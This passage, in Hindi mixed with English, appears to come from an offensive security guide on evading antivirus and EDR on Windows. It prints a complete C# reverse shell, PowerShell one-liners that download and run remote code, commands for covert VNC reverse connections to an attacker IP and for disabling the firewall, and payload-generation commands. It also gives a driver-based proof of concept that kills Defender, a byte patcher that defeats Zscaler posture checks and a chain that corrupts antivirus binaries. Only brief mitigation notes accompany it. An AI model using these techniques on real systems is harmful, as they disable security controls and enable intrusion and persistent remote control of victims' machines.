```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile select करें
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा तथा constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और कठिन बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहा जाता है) से replace करता है। **ProxyCall-Remover** से इन्हें remove करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस step के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखाई देने चाहिए।

4.  Manual clean-up – परिणामी binary को dnSpy में run करें और *real* payload को locate करने के लिए बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को search करें। अक्सर malware इसे `<Module>.byte_0` के अंदर initialized TLV-encoded byte array के रूप में store करता है।

ऊपर दी गई chain malicious sample को run करने की आवश्यकता के बिना execution flow restore करती है – offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का custom attribute बनाता है, जिसका उपयोग samples को automatically triage करने के लिए IOC के रूप में किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से बढ़ी हुई software security प्रदान करने में सक्षम हो।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह प्रदर्शित करता है कि किसी external tool का उपयोग किए बिना और compiler को modify किए बिना, compile time पर obfuscated code generate करने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generated obfuscated operations की एक layer जोड़ता है, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा कठिन हो जाता है।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो विभिन्न pe files को obfuscate करने में सक्षम है, जिनमें शामिल हैं: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator LLVM-supported languages के लिए ROP (return-oriented programming) का उपयोग करने वाला एक fine-grained code obfuscation framework है। ROPfuscator assembly code level पर program को regular instructions को ROP chains में transform करके obfuscate करता है, जिससे normal control flow की हमारी स्वाभाविक समझ विफल हो जाती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert करके उन्हें load करने में सक्षम है

## SmartScreen & MoTW

आपने internet से कुछ executables download करके उन्हें execute करते समय यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को potentially malicious applications चलाने से सुरक्षित रखना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach के साथ काम करता है, जिसका अर्थ है कि uncommon download applications SmartScreen को trigger करेंगी, जिससे end user को alert किया जाएगा और file execute करने से रोका जाएगा (हालांकि More Info -> Run anyway पर click करके file को फिर भी execute किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जिसका नाम Zone.Identifier है। यह internet से files download करते समय अपने-आप create हो जाता है और इसमें उस URL की जानकारी भी होती है, जिससे file download की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना महत्वपूर्ण है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web प्राप्त करने से रोकने का एक बहुत प्रभावी तरीका उन्हें ISO जैसे किसी container के अंदर package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर apply **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक ऐसा tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण उपयोग:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहाँ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके payloads को ISO files के अंदर package करके SmartScreen bypass करने का एक demo है

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने की अनुमति देता है। हालांकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

जिस तरह AMSI को disable (bypass) किया जाता है, उसी तरह user space process के **`EtwEventWrite`** function को बिना कोई events log किए तुरंत return करने के लिए भी बदला जा सकता है। यह memory में function को patch करके तुरंत return कराने से किया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

आपको **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर अधिक जानकारी मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करना काफी समय से जाना जाता है और AV की नजर में आए बिना अपने post-exploitation tools को run करने का यह अभी भी एक बहुत अच्छा तरीका है।

चूंकि payload सीधे memory में load होगा और disk को touch नहीं करेगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn करना**, अपने post-exploitation malicious code को उस नए process में inject करना, अपने malicious code को execute करना और काम पूरा होने पर नए process को kill करना शामिल है। इसके अपने फायदे और नुकसान दोनों हैं। fork and run method का लाभ यह है कि execution हमारे **Beacon implant process** के **बाहर** होता है। इसका अर्थ है कि यदि हमारी post-exploitation action में कुछ गलत हो जाता है या वह detect हो जाती है, तो हमारे **implant के survive करने की संभावना बहुत अधिक होती है।** नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक होती है**।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject करना शामिल है। इस तरह आप नया process बनाने और उसे AV द्वारा scan करवाने से बच सकते हैं, लेकिन नुकसान यह है कि यदि आपके payload के execution में कुछ गलत हो जाता है, तो **अपना beacon खोने की** **संभावना बहुत अधिक होती है**, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में अधिक पढ़ना चाहते हैं, तो यह article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) देखें।

आप **PowerShell से भी** C# Assemblies load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## Other Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment** का access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment का access देकर आप इन languages में **compromised machine की memory के भीतर arbitrary code execute कर सकते हैं**।

Repo के अनुसार: Defender अभी भी scripts को scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक flexibility** होती है। इन languages में random un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping किसी security product, जैसे EDR या AV, के access token को manipulate करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि वह privileged inspection या remediation actions करने में असमर्थ हो जाता है।

इसे रोकने के लिए Windows **external processes को** security processes के tokens पर handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उसे takeover करना तथा persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें और फिर MSI file download करने के लिए Windows वाली MSI file पर click करें।
2. Victim में installer को silently run करें (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने के लिए कहेगा; जारी रखने के लिए Authorize button पर click करें।
4. आवश्यक adjustments के साथ दिया गया command execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN set करता है)।


## Advanced Evasion

Evasion एक बहुत complicated topic है। कभी-कभी आपको केवल एक system में telemetry के कई अलग-अलग sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के विरुद्ध जाते हैं, उसकी अपनी strengths और weaknesses होती हैं।

मैं आपको अत्यधिक recommend करता हूँ कि [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखें, ताकि Advanced Evasion techniques की बेहतर समझ मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth के बारे में एक और शानदार talk भी है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **देखें कि Defender को binary के कौन-से parts malicious मिलते हैं**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के parts को remove करता है** जब तक कि वह **यह पता न लगा ले कि Defender को कौन-सा part** malicious मिल रहा है, और फिर उसे आपके लिए split कर देता है।\
एक अन्य tool जो **यही काम करता है** [**avred**](https://github.com/dobin/avred) है, जिसमें यह service एक open web offering के रूप में [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** शामिल होता था, जिसे आप (administrator के रूप में) इस command द्वारा install कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम शुरू होने पर इसे **start** करें और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) **और firewall disable करें:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहाँ से download करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**ON THE HOST**: _**winvnc.exe**_ execute करें और server configure करें:

- _Disable TrayIcon_ option enable करें
- _VNC Password_ में password set करें
- _View-Only Password_ में password set करें

फिर binary _**winvnc.exe**_ और **नव-निर्मित** file _**UltraVNC.ini**_ को **victim** के अंदर move करें

#### **Reverse connection**

**attacker** को अपने **host** के अंदर binary `vncviewer.exe -listen 5900` **execute** करना चाहिए, ताकि वह reverse **VNC connection** catch करने के लिए **prepared** रहे। फिर, **victim** के अंदर: winvnc daemon start करें `winvnc.exe -run` और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` run करें

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ कार्य नहीं करने चाहिए

- अगर `winvnc` पहले से running है, तो उसे start न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) trigger होगा। `tasklist | findstr winvnc` से check करें कि वह running है या नहीं
- उसी directory में `UltraVNC.ini` के बिना `winvnc` start न करें, वरना [the config window](https://i.imgur.com/rfMQWcf.png) open हो जाएगी
- Help के लिए `winvnc -h` run न करें, वरना [popup](https://i.imgur.com/oc18wcu.png) trigger होगा

### GreatSCT

इसे यहाँ से download करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और इस कमांड से **xml payload** को **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current Defender process को बहुत जल्दी terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इस कमांड से compile करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसके साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler का उपयोग
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित download और execution:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectors बनाने के लिए python का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver लाना (BYOVD) – Kernel Space से AV/EDR को समाप्त करना

Storm-2603 ने ransomware डालने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नामक एक छोटी console utility का उपयोग किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाता है और उसका दुरुपयोग करके privileged kernel operations जारी करता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: disk पर deliver की गई file `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का legitimately signed driver `AToolsKrnl64.sys` है। क्योंकि driver पर valid Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, जिससे `\\.\ServiceMouse` user land से accessible हो जाता है।
3. **Driver द्वारा exposed IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए उपयोग किया जाता है) |
| `0x990000D0` | disk पर किसी भी file को delete करना |
| `0x990001D0` | driver को unload करना और service को remove करना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह bypass करता है; kernel में execute होने वाला code *protected* processes को open कर सकता है, उन्हें terminate कर सकता है या kernel objects के साथ tamper कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening features मौजूद हों।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से मना कर दे।
•  नई *kernel* services के creations को monitor करें और तब alert करें जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
•  Custom device objects के लिए user-mode handles के बाद होने वाली suspicious `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के जरिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को locally लागू करता है और results को अन्य components तक communicate करने के लिए Windows RPC पर निर्भर करता है। Design की दो कमजोर choices full bypass को संभव बनाती हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है ( `WinVerifyTrust` के जरिए)।<sup>[[11]](#references)</sup>

**disk पर मौजूद चार signed binaries को patch करके**, दोनों mechanisms को neutralise किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` return करता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी (unsigned भी) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से replace किया गया |
| `ZSATunnel.exe` | tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल files को replace करने और service stack को restart करने के बाद:

* **सभी** posture checks **green/compliant** दिखाई देते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints (जैसे `\\RPC Control\\ZSATrayManager_talk_to_me`) खोल सकते हैं।
* Compromised host को Zscaler policies द्वारा परिभाषित internal network तक unrestricted access मिल जाता है।

यह case study दिखाती है कि पूरी तरह client-side trust decisions और simple signature checks को कुछ byte patches के साथ हराया जा सकता है।

## LOLBINs के साथ Protected Process Light (PPL) का दुरुपयोग करके AV/EDR से छेड़छाड़

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है, ताकि केवल समान या उच्च protected processes ही एक-दूसरे से छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, यदि आप किसी PPL-enabled binary को वैध रूप से launch कर सकते हैं और उसके arguments को control कर सकते हैं, तो आप benign functionality (जैसे logging) को protected directories के विरुद्ध constrained, PPL-backed write primitive में बदल सकते हैं, जिनका उपयोग AV/EDR करते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

किसी process को PPL के रूप में run कराने वाली बातें
- Target EXE (और कोई भी loaded DLLs) PPL-capable EKU से signed होने चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके create करना होगा: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- एक compatible protection level request किया जाना चाहिए, जो binary के signer से match करे (जैसे anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, और Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels creation को fail कर देंगे।

PP/PPL और LSASS protection के व्यापक introduction के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level select करता है और arguments को target EXE तक forward करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` स्वयं को spawn करता है और caller-specified path पर log file लिखने के लिए एक parameter स्वीकार करता है।
- PPL process के रूप में launch किए जाने पर, file write PPL backing के साथ होता है।
- ClipUp spaces वाले paths को parse नहीं कर सकता; सामान्यतः protected locations में point करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची: प्रत्येक parent directory में `dir /x` चलाएँ।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launcher (जैसे CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-capable LOLBIN (ClipUp) launch करें।
2) Protected AV directory (जैसे Defender Platform) में file creation force करने के लिए ClipUp का log-path argument पास करें। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) यदि target binary चलते समय AV द्वारा सामान्यतः open/locked रहती है (जैसे MsMpEng.exe), तो write को boot पर AV शुरू होने से पहले schedule करें, इसके लिए ऐसा auto-start service install करें जो विश्वसनीय रूप से पहले चले। Process Monitor (boot logging) से boot ordering validate करें।
4) Reboot पर PPL-backed write AV द्वारा अपनी binaries को lock करने से पहले होता है, जिससे target file corrupt हो जाती है और startup रुक जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
नोट्स और सीमाएँ
